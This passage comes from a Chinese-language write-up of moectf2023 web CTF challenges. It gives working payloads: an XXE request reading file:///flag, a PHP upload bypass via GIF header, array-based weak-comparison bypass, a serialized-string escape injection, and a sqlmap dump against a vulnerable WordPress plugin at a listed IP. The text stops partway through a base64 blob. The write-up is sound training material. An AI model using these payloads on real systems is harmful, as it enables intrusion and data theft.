<span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;document&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;navigate&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;cross-site&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="hljs-string">&#x27;?1&#x27;</span>,<br>&#125;<br><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;-----------------------------15719226131077920622631907538</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;xml_content&quot;</span><br><span class="hljs-string">Content-Type: text/xml</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE a[</span><br><span class="hljs-string">    &lt;!ENTITY b SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;xml&gt;&lt;name&gt;&amp;b;&lt;/name&gt;&lt;/xml&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------15719226131077920622631907538--</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>response = requests.post(<span class="hljs-string">&#x27;http://localhost:62103/&#x27;</span>, headers=headers, data=data)<br><br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h3 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h3><p><img src="/mdimg/moectf2023/29.png"><br>加个gif头就能上传<br>发现可以上传php<br>但是不知道目录<br>一直尝试也访问不到木马<br>换思路<br><code>images.php</code>能读文件，拿来读flag<br><img src="/mdimg/moectf2023/30.png"><br><img src="/mdimg/moectf2023/31.png"><br>弱比较数组绕过<br><code>?param1[]=1&amp;param2[]=2</code></p><h3 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;Hanxin.exe.php&#x27;</span>);<br><br><span class="hljs-variable">$Chant</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>] : <span class="hljs-string">&#x27;夺命十三枪&#x27;</span>;<br><br><span class="hljs-variable">$new_visitor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="hljs-variable">$Chant</span>);<br><br><span class="hljs-variable">$before</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$new_visitor</span>);<br><span class="hljs-variable">$after</span> = <span class="hljs-title class_">Deadly_Thirteen_Spears</span>::<span class="hljs-title function_ invoke__">Make_a_Move</span>(<span class="hljs-variable">$before</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Movements: &#x27;</span> . <span class="hljs-variable">$after</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$after</span>);<br>&#125;<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Even Caused A Glitch...&quot;</span>;<br>&#125;<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-keyword">__FILE__</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Deadly_Thirteen_Spears</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Lovesickness&quot;</span>,<br>        <span class="hljs-string">&quot;di_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Heartbreak&quot;</span>,<br>        <span class="hljs-string">&quot;di_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Blind_Dragon&quot;</span>,<br>        <span class="hljs-string">&quot;di_si_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Romantic_charm&quot;</span>,<br>        <span class="hljs-string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Peerless&quot;</span>,<br>        <span class="hljs-string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;White_Dragon&quot;</span>,<br>        <span class="hljs-string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Penetrating_Gaze&quot;</span>,<br>        <span class="hljs-string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Kunpeng&quot;</span>,<br>        <span class="hljs-string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Overlord&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Letting_Go&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Decisive_Victory&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Unrepentant_Lethality&quot;</span><br>    );<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Make_a_Move</span>(<span class="hljs-params"><span class="hljs-variable">$move</span></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$index</span> =&gt; <span class="hljs-variable">$movement</span>)&#123;<br>            <span class="hljs-variable">$move</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$index</span>, <span class="hljs-variable">$movement</span>, <span class="hljs-variable">$move</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$move</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Chant</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Spear_Owner</span> = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$chant</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Chant = <span class="hljs-variable">$chant</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;Spear_Owner = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;Spear_Owner !== <span class="hljs-string">&#x27;MaoLei&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Far away from COOL...&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>通过<code>__toString()</code>满足if读flag<br><img src="/mdimg/moectf2023/32.png"><br><code>Make_a_Move</code>方法替换序列化之后的字符<br><code>di_jiu_qiang</code>长度12 替换为：<code>string(32) &quot;Night_Parade_of_a_Hundred_Ghosts&quot;</code>逃逸20<br>可以看到替换后Chant属性的字符长度没变<br>可以字符串逃逸<br><code>string(35) &quot;&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;&quot;</code><br>需要逃逸35个字符<br><code>di_shi_san_qiang</code>16 –&gt;    <code>string(21) &quot;Unrepentant_Lethality&quot;</code>逃逸5<br>payload：<code>?chant=di_jiu_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></p><h3 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h3><p><img src="/mdimg/moectf2023/33.png"><br><code>[http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php](http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: Visitor auto recorder</span><br><span class="hljs-comment">Description: Automatically record visitor&#x27;s identification, still in development, do not use in industry environment!</span><br><span class="hljs-comment">Author: KoKoMi</span><br><span class="hljs-comment">  Still in development! :)</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 不许偷看！这些代码我还在调试呢！</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// 加载数据库配置，暂时用硬编码绝对路径</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;/var/www/html/wordpress/&#x27;</span> . <span class="hljs-string">&#x27;wp-config.php&#x27;</span>);<br><br><span class="hljs-variable">$db_user</span> = DB_USER; <span class="hljs-comment">// 数据库用户名</span><br><span class="hljs-variable">$db_password</span> = DB_PASSWORD; <span class="hljs-comment">// 数据库密码</span><br><span class="hljs-variable">$db_name</span> = DB_NAME; <span class="hljs-comment">// 数据库名称</span><br><span class="hljs-variable">$db_host</span> = DB_HOST; <span class="hljs-comment">// 数据库主机</span><br><br><span class="hljs-comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span><br><span class="hljs-comment">// 这些是临时的代码</span><br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$user_agent</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_agent&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;time&#x27;</span>]);<br><br><span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$db_host</span>, <span class="hljs-variable">$db_user</span>, <span class="hljs-variable">$db_password</span>, <span class="hljs-variable">$db_name</span>);<br><br><span class="hljs-comment">// 检查连接是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mysqli</span>-&gt;connect_errno) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据库连接失败: &#x27;</span> . <span class="hljs-variable">$mysqli</span>-&gt;connect_error;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#x27;<span class="hljs-subst">$ip</span>&#x27;, &#x27;<span class="hljs-subst">$user_agent</span>&#x27;, <span class="hljs-subst">$time</span>)&quot;</span>;<br><br><span class="hljs-comment">// 执行插入</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$mysqli</span>, <span class="hljs-variable">$query</span>);<br><br><span class="hljs-comment">// 检查插入是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据插入成功&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据插入失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$mysqli</span>);<br>&#125;<br><br><span class="hljs-comment">// 关闭数据库连接</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$mysqli</span>);<br><br><span class="hljs-comment">//gpt真好用</span><br>数据插入失败: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="hljs-keyword">for</span> the right syntax to <span class="hljs-keyword">use</span> <span class="hljs-title">near</span> &#x27;)&#x27; <span class="hljs-title">at</span> <span class="hljs-title">line</span> 1<br></code></pre></td></tr></table></figure><p><code>sqlmap -r 1.txt --batch -D wordpress -T secret_of_kokomi  -C content --dump</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /wordpress/wp-content/plugins/visitor-logging/logger.php?http:%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f<span class="hljs-number">101.42.178.83:7770</span>%<span class="hljs-number">2</span>fwordpress%<span class="hljs-number">2</span>fwp-content%<span class="hljs-number">2</span>fplugins%<span class="hljs-number">2</span>fvisitor-logging%<span class="hljs-number">2</span>flogger.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">101.42.178.83:7770</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">109</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">117</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">24</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">101.42.178.83:7770</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">101.42.178.83:7770</span>/wordpress/wp-content/plugins/visitor-logging/logger.php<br><span class="hljs-attribute">Cookie</span>: comment_author_4c9aa5fddaa9877c73e1c45596fe15bd=a; comment_author_email_4c9aa5fddaa9877c73e1c45596fe15bd=a%<span class="hljs-number">40</span>a.com; comment_author_url_4c9aa5fddaa9877c73e1c45596fe15bd=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fa.com; wordpress_test_cookie=WP%<span class="hljs-number">20</span>Cookie%<span class="hljs-number">20</span>check<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">ip</span>=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">2</span>&amp;time=<span class="hljs-number">3</span><br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/moectf2023/34.png"></p><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> users, salt<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> http.server<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    FLAG = f.read().strip()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):      <span class="hljs-comment"># *items形参元组      </span><br>    c = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>)   <span class="hljs-comment"># it looks so complex! but is it safe enough?</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br><span class="hljs-keyword">assert</span> users[<span class="hljs-string">&quot;admin&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span><br><br>hashed_users = <span class="hljs-built_in">dict</span>((k,gethash(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users.items())    <span class="hljs-comment">#生成字典</span><br><br><span class="hljs-built_in">eval</span>([[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> base64.b64encode <span class="hljs-keyword">in</span> [base64.b64decode]]) <span class="hljs-comment"># what is it?</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data:<span class="hljs-built_in">str</span></span>):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            data = base64.b64encode(data).decode() <span class="hljs-comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br>        <span class="hljs-keyword">return</span> data<br><br>__page__ = base64.b64encode(<span class="hljs-string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhb